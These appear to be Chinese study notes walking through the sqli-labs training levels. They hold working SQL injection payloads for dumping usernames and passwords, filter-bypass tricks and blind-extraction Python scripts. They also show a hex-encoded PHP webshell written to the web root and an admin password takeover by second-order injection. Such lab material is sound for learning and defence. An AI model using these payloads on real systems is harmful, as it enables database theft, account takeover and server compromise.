## 知识点
### 过滤绕过
- 空格->`/**/`或`()`或`%0a`
- = ->like
- or -> `||` ，or过滤的话，`order by` 不能用了，但查字段数不是必须的，可以直接看回显位 `information_schema`也不能用了,可以试一下`mysql.innodb_table_stats`或者`information_schema.tables`
- and -> `&&`
- `,` -> join 例如`select * from (select 1)a join (select 2)b join(select 3)c`等于`union select 1,2,3`,也可以用from to ,例如`select ascii (substr(user() from 1 for 1)) > 110`同`select ascii (substr(user() , 1 , 1)) > 110` 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：`select substr(database(0from1for1);select mid(database(0from1for1);`对于limit可以使用offset来绕过：`select*fromnews limit0,1#` 等价于下面这条SQL语句`select*fromnews limit1offset0`
- 使用offset关键字，
- `not` -> `!`
- `xor` -> `|`
- 如果`like`被过滤了，`in`也可以用于布尔盲注，用于判断列名中是否存在此关键字，例如`select * from users where id = 1 and substr(user(),1,1) in ('r')`,表示查询user()中id = 1的行的第一个字符是否为 r
- 引号过滤,可以用十六进制编码，这样字符就可以不用引号包裹了，例如`='security'`可以写成`=0x7365637572697479`
- `sleep`被过滤可以用benchmark()代替，这个函数`benchmark(1000000,sha1(1))`表示执行`sha1(1)`函数1000000遍，通过消耗cpu资源来达到延时效果。
- 如果`#`和`--`都过滤了，可以用`'1'='1`来闭合后面的单引号，从而达到注释的效果。
- SQL大小写不敏感，许多都可以试一下大小写绕过。
- 双写绕过
更多过滤可以参考
https://blog.csdn.net/devil8123665/article/details/108746947
### 小细节
如果`--`被过滤了，可以用`#`代替注释，但是`#`在url栏里有特殊含义，必须用url编码`%23`，但是脚本里的#就不用url编码了，因为他会自动编码。
### 其他
如果是在本地搭建靶场，可以在终端打开数据库进行操作，`mysql -h localhost -P 3306 -u root -p`打开数据库。
### 联合查询
**原因**：原因是sql底层逻辑是`SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1`用户输入直接被拼接到了`$id`但是如果直接`select`的话会出现两个独立的 `SELECT`，MySQL 无法解析这种 “多 SELECT 堆叠”，而union可以**将两个 SELECT 查询的结果集合并成一个**；但前提是两个 SELECT 的**列数必须一致**（原查询 `SELECT * FROM users` 是 3 列，所以 `union select 1,2,3` 也写 3 列）；导致语法合法，MySQL 会执行这个语句，且因为 `id=-1` 让原查询无结果，最终只显示 `union select` 的结果（1,2,3）。
**流程**：
- 先判断字段值`1' order by 3--+`如果字段数大于实际的，会报错。`--+`是注释用的。
- 看回显位`-1' union select 1,2,3--+`写-1是为了让原查询的结果集为空，原查询无结果时，仅显示联合查询结果。union是MYSQL中用于合并两个或多个SELECT语句的结果集。看到2，3则说明2和3是回显位。
- 用`?id=-1'union select 1,2,group_concat(schema_name) from information_schema.schemata--+` 可以列出所有数据库（回显`information_schema,challenges,mysql,performance_schema,security`），而后面的`database()`可以返回当前会话正在使用的数据库。
- 查数据库，`-1' union select 1,2,database()--+`把`database()`放到回显位上才可以看到。
- 查表名，`-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+` 
- `information_schema`：MySQL 内置的系统数据库，存储了所有数据库、表、列的元数据（可以理解为 “数据库的目录”）。
- 查列名`-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+`
- 查数据库信息`?id=-1' union select 1,2,group_concat(password) from security.users%23`可以查到password内容，如果想username，password显示在一起，可以用`?id=-1' union select 1,2,group_concat(concat_ws('~',username,password)) from security.users%23`是使用`~`分割开username和password
### 报错注入
- **原理**：**用 MySQL 内置的报错函数（如 `updatexml()`、`extractvalue()`），强制让数据库执行恶意查询后，将查询结果以 “报错信息” 的形式输出到页面**—— 无需依赖 `UNION SELECT` 的列数匹配、原查询无结果等前提，只要页面会显示数据库报错，就能提取数据，是无回显场景下的首选方法。
#### 常用函数
- `updatexml(1,拼接的恶意内容,1)`用于更新XML文档，要求第二个参数是合法的XPath路径，否则报错显示非法内容。如果恶意内容是`concat(0x7e,database(),0x7e)`其中`0x7e`代表的`~`是XPath路径不允许出现的字符，就会触发报错，带出数据库名。`0x5c`代表的`\`也可以触发报错。
- `extractvalue(1,拼接的恶意内容)`原理同上
- `floor`+`count`+`rand` 利用分组统计的重复值冲突报错
- `rand();`随机返回0-1间的小数，功能如下![](/image/144.png)计算结果在0-1
	![](/image/145.png)结算结果在0-3![](/image/146.png)根据user的行数随机显示结果
- `floor()`函数：小数向下取整函数。![](/image/147.png)结果随机是0或1
- ![](/image/148.png)结果随机。但是如果`rand()`里有参数，输出的结果就会有一定顺序，
- `count()`函数，汇总统计数量。
- group by子句: 分组语句，常用于，结合统计函数，根据一个或多个列，对结果集进行分组  
- as: 别名
- `select count(*),concat_ws('~',(select database()),floor(rand(0)*2)) as a from users group by a;`![](/image/149.png)可以爆出数据库。
- 解释原因：rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复，导致报错。
- `count(*)`统计user表的行数。
-  **第一步**：遍历 `users` 表第 1 行 → 计算 `a = security~0` → 预判该分组不存在，准备创建 `security~0` 分组 → 验证时重新计算 `floor(rand(0)*2)`（序列下一个值是 1）→ 实际 `a = security~1`；
-  **第二步**：遍历 `users` 表第 2 行 → 计算 `a = security~1` → 预判该分组不存在，准备创建 `security~1` 分组 → 验证时重新计算 `floor(rand(0)*2)`（序列下一个值是 1）→ 实际 `a = security~1`；
-  **冲突爆发**：MySQL 尝试创建 `security~1` 分组时，发现该分组已存在（第二步验证时的结果），触发 **Duplicate entry（重复条目）** 报错，且报错信息会直接显示冲突的 `a` 值（即 `security~1`）。
**流程**：
- 先`-1' and updatexml(1,concat(0x7e,database(),0x7e),1)#`查数据库。
- 再`-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)#`查表名。
- 再`-1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1)#`查库名。
- 再查字段名`-1' and updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1)`但是这样写会报错`You can't specify target table 'users' for update in FROM clause`是因为MySQL 不允许在同一个语句中，既从某张表（如 `users`）查询数据，又将该查询结果直接作为 `updatexml()` 等函数的参数（相当于 “间接更新 / 引用” 该表），因为外层语句是`SELECT * FROM users WHERE id='$id'`外层查询已经在访问user表，内层子查询又直接查询 `security.users`，并将结果传给 `updatexml()`——MySQL 会认为你 “在操作 `users` 表的同时又读取该表”，触发 “不能在 FROM 子句中指定更新的目标表” 的保护机制。
- 解决方法是将内层查询的结果放到 MySQL 临时生成的 “派生表”（用 `(...) as 别名` 包裹），让 MySQL 认为你查询的是 “临时表” 而非原 `users` 表，从而解除限制。
- `-1' and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,username,password)) from (select username,password from security.users) as temp),0x7e),1)#`但是updatexml限制最多输出32个字符，可以用`substr`逐段截取。`-1' and updatexml(1,concat(0x7e,substr((select group_concat(concat_ws(0x7e,username,password)) from (select username,password from security.users) as temp),65,32),0x7e),1)#`这样可以把字段，分段爆出来。
- 用`extractvalue()`函数同理。
- 但也可以用另一种报错注入方式，用`floor`+`count` 
- `1' union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x--+`查数据库
- `1' union select 1,count(*),concat_ws('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from users group by a--+`查表名
- `1' union select 1,count(*),concat_ws('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),floor(rand(0)*2)) as a from users group by a--+`查库名
- `1' union select 1,count(*),concat_ws('~',(select group_concat(column_name) from security.users),floor(rand(0)*2)) as a from users group by a--+`用这个查密码实测不行，因为太多了，一次性查不过来，可以用concat一个一个查，`1' union select 1,count(*),concat((select password from security.users limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x --+`通过修改`limit 0,1`来一个一个查密码。
### 二次注入
- 攻击者先将恶意 SQL 代码 “无害地” 存入数据库（比如注册 / 修改资料时输入），当应用后续从数据库读取该数据并直接拼接到 SQL 语句中执行时，恶意代码才会触发 —— 简单说就是 “**先存恶意代码，后执行恶意代码**”，区别于普通注入 “即时输入、即时执行” 的特征。
- 例如可以试一下登录admin，但是密码不知道，登录失败，可以注册一个用户名为`admin'#`登录后可以修改密码，因为单引号用于闭合，井号用于注释后面代码。所以用户名就成了admin，修改密码就修改的是admin用户的密码。
- 造成漏洞的原因是从数据库取出用户名时没有进行转义，造成了单引号闭合。从而修改了admin用户的密码。
## Less-1
- 输入`?id=1\`通过报错` near ''1\' LIMIT 0,1' at line 1`可知是单引号闭合，使用联合查询。
- 流程同上述知识点。
## Less-2
- 试着输入`?id=1\`报错`near '\ LIMIT 0,1' at line 1`可知没有闭合，其余同联合查询基本流程。
## Less-3
- 试着输入`?id=1\`报错`near ''1\') LIMIT 0,1' at line 1`可知是`')`闭合的。其余同联合查询基本流程。
## Less-4
- 试着输入`?id=1\`报错`near ''1\") LIMIT 0,1' at line 1`可知是`')`闭合的。其余同联合查询基本流程。
## Less-5
- 输入`?id=1\`通过报错` near ''1\' LIMIT 0,1' at line 1`可知是单引号闭合
- 但是输入`?id=1`回显`You are in...........` 输入`?id=1' and 1=2%23`没有回显，可知是布尔盲注了。
**脚本**：
```python
import requests  
  
url=input("请输入url:")  
  
def check(payload):  
    r=requests.get(url,params={"id":payload})  
    if "You are in..........." in r.text:  
        return True  
    else:  
        return False  
  
result=""  
chars="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&'()*+,-./:;<=>?@[\]^`{|}~"  
  
for i in range(1,100):  
    for c in chars:  
        # -1' or substr((select database()),{i},1)='{c}'#  
        # -1' or substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{i},1)='{c}'#        
        # -1' or substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),{i},1)='{c}'#        
        # -1' or substr((select group_concat(concat_ws('~',username,password)) from security.users),{i},1)='{c}'#        
        payload=f"-1' or substr((select group_concat(concat_ws('~',username,password)) from security.users),{i},1)='{c}'#"  
        if check(payload):  
            result += c  
            break  
    print(result)
```
因为脚本发送get请求是自动url编码，所以`#`没有必要url编码了。或者可以用`-- `
`substr(a,b,c)`是用来截取字符串的函数a表示要被截取的字符串，b表示起始位置，c表示一次截取几个字符串。
脚本必须用`for i in range(1,100)`不可以用`for i in range(100)`因为是从1开始的，不是从0开始的。
**特殊解法**：用floor分组冲突报错,把原本需要盲猜的内容直接通过报错带出 `1' union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x--+`可以爆出
## Less-6
- 这一关依旧布尔盲注，不过使用双引号`"`闭合
## Less-7
- 输入`?id=1\`报错`You have an error in your SQL syntax`。
- 可以试一下`?id=1'))--+`回显`You are in.... Use outfile......`可知成功了，看似也是布尔盲注。
- 但又试了一下`?id=1')) and 1=2--+`发现回显还是`You are in.... Use outfile......`布尔盲注应该不行了，试一下`?id=1')) and if(1=1,sleep(2),1)--+`发现是可以延时的。实测时间盲注可以。
- 但是这道题有一个特殊的解法，那就是写入一句话木马。
- 可以试着查看版本，如果是`5.0-5.5.x`，`secure_file_priv` 默认为空（无限制），`FILE` 权限默认开放；可以试着写入一句话木马。
- 写入`?id=-1')) union select 1,2,0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e into outfile "D:/phpstudy_pro/WWW/localhost/666.php";--+`可以在目标服务器写一个一句话木马，一句话木马要16进制编码，防止单引号错误闭合。
- 在做这道题时犯了一个错误，就是直接`select`而没有`unino select 1,2,`原因是sql底层逻辑是`SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1`用户输入直接被拼接到了`$id`但是如果直接`select`的话会出现两个独立的 `SELECT`，MySQL 无法解析这种 “多 SELECT 堆叠”，而union可以**将两个 SELECT 查询的结果集合并成一个**；但前提是两个 SELECT 的**列数必须一致**（原查询 `SELECT * FROM users` 是 3 列，所以 `union select 1,2,3` 也写 3 列）；导致语法合法，MySQL 会执行这个语句，且因为 `id=-1` 让原查询无结果，最终只显示 `union select` 的结果（1,2,3）。
## Less-8
- 这一关依旧布尔盲注，单引号闭合。
## Less-9
- 这一关不论输入什么都回显一样，可以用时间盲注。
脚本
```python
import requests  
import time  
  
url = input("请输入url")  
  
def check(payload):  
    start_time = time.time()  
    r=requests.get(url,params={'id':payload})  
    end_time = time.time()  
    response_time = end_time - start_time  
    if response_time > 1.9:  
        return True  
    else:  
        return False  
  
result=""  
chars="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&'()*+,-./:;<=>?@[\]^`{|}~"  
  
for i in range(1,100):  
    for c in chars:  
        # 1' and if(substr((select database()),{i},1)='{c}',sleep(2),1)#  
        # 1' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{i},1)='{c}',sleep(2),1)#        
        # 1' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),{i},1)='{c}',sleep(2),1)#        
        payload=f"1' and if(substr((select group_concat(concat_ws('~',username,password)) from security.users),{i},1)='{c}',sleep(2),1)#"  
        if check(payload):  
            result += c  
            break  
    print(result)
```
## Less-10
- 测试输入`?id=1" and if(1=1,sleep(2),1)--+`发现是双引号闭合，其余同上。
## Less-11
- 这一关用post请求
- 在uname字段输入`1' or 1=1#`成功执行，可知是单引号闭合。
- 输入`passwd=1' union select 1,2#&submit=Submit&uname=admin`可知1，2都回显
- `passwd=1' union select 1,database()`查数据库
- `passwd=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#&submit=Submit&uname=`查表名
- 其余操作就重复了。
## Less-12
- 这一关用`")`闭合，其余同上。
## Less-13
- 输入`passwd=1') or 1=2#&submit=Submit&uname=admin` 发现用`')`闭合，但是没有回显，可以打时间盲注。
脚本要稍微改一下，因为是post请求，并且不只一个参数。
```python
import requests  
import time  
  
url = input("请输入url")  
  
def check(payload):  
    start_time = time.time()  
    r=requests.post(url,data={'passwd':'admin','submit':'Submit','uname':payload})  
    end_time = time.time()  
    response_time = end_time - start_time  
    if response_time > 1.9:  
        return True  
    else:  
        return False  
  
result=""  
chars="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&'()*+,-./:;<=>?@[\]^`{|}~"  
  
for i in range(1,100):  
    for c in chars:  
        # 1' and if(substr((select database()),{i},1)='{c}',sleep(2),1)#  
        # 1' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{i},1)='{c}',sleep(2),1)#        
        # 1' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),{i},1)='{c}',sleep(2),1)#        
        payload=f"1') or if(substr((select database()),{i},1)='{c}',sleep(2),1)#"  
        if check(payload):  
            result += c  
            break  
    print(result)
```
这里就不可以用and了，因为用户名没有一个指定的数字代号，写一个1肯定是是错的。
## Less-14
- 双引号闭合，依然时间盲注。
## Less-15
- 单引号闭合，依旧时间盲注。
## Less-16
- 用`")`闭合，依旧时间盲注。
## Less-17
- 这一关提示更改密码，就是更改数据库，使用报错注入。
- 经测试，这一关只能在passwd字段注入，执行`-1' and updatexml(1,concat(0x5c,database(),0x5c),1)#`成功执行，
- 接下来的方法就同上述报错注入基本流程相同了。
- 但是用`floor()`没成功，一直显示`Data too long for column 'password' at row 8`
## Less-18
- 因为user-agent字段可以显示到界面中，所以可以在user-agent字段注入。
- 原理基本同上，但是user-agent里不可以用注释，所以必须用`-1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1`即`'1'='1`来闭合后面的引号，达到注释效果。
- 其余就相同了,依旧报错注入
## Less-19
- 这一关是referer,除了注入点不同，其余同上一关。
## Less-20
- 这一关使用cookie，其余同上。
## Less-21
- 看源码`$cookee = base64_decode($cookee);`
- `$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";` 这一关看似用`')`包裹的，其实只用管单引号就行了，因为括号本来就是闭合的。
- 这一关在上一关的基础上把paylaod用base64编码就行了。
## Less-22
- 看源码`$cookee1 = '"'. $cookee. '"';`
- 这一关用的是双引号闭合,其余同上。
## Less-23
- 看源码
```php
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
```
可以看到把`#`和`--`过滤了，但可以用`'1'='1`代替注释。
- `-1'  union select 1,database(),3 and '1'='1`查到数据库，其余和第一关类似。
## Less-24
- 这一关有好多功能，可以登录，注册，改密码。
- 所以可以用二次注入。
- 看一下登录的后端代码
```php
function sqllogin(){
   $username = mysql_real_escape_string($_POST["login_user"]);
   $password = mysql_real_escape_string($_POST["login_password"]);
   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";
   $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');
   $row = mysql_fetch_row($res);
   //print_r($row) ;
   if ($row[1]) {
         return $row[1];
   } else {
            return 0;
   }
}
```
- `mysql_real_escape_string()` 是 PHP 中针对 MySQL 数据库的**字符串转义函数**，核心目的是**防止普通 SQL 注入**—— 它会对字符串中的「SQL 特殊字符」进行转义（添加反斜杠 `\`），让这些字符从 “SQL 语法字符” 变成 “普通字符串字符”，从而避免恶意 SQL 代码被执行。
- 这样看来在登录界面是不行了，看一下注册界面。
- 但是注册界面没有什么限制，可以试一下注册用户`admin'#`密码123456注册后登录，登录成功了。再修改密码为123456，然后登录`admin`密码输入`123456` 登录成功，这样就实现了在不知道用户密码的情况下修改密码。
- 单引号，闭合`#`注释，密码就随便了
## Less-25
- 这一关or和and被过滤了，大小写绕过不了，可以用双写绕过`oorr`，也可以用`||`代替or。
- `information_schema`用`infoorrmation_schema`绕过
- `-1' and union select 1,2,group_concat(username,passwoorrd) from users--+ `查到用户密码
## Less-25a
- 这一关不用数字闭合，直接`-1 and union select 1,2,group_concat(username,passwoorrd) from users--+`就行了。
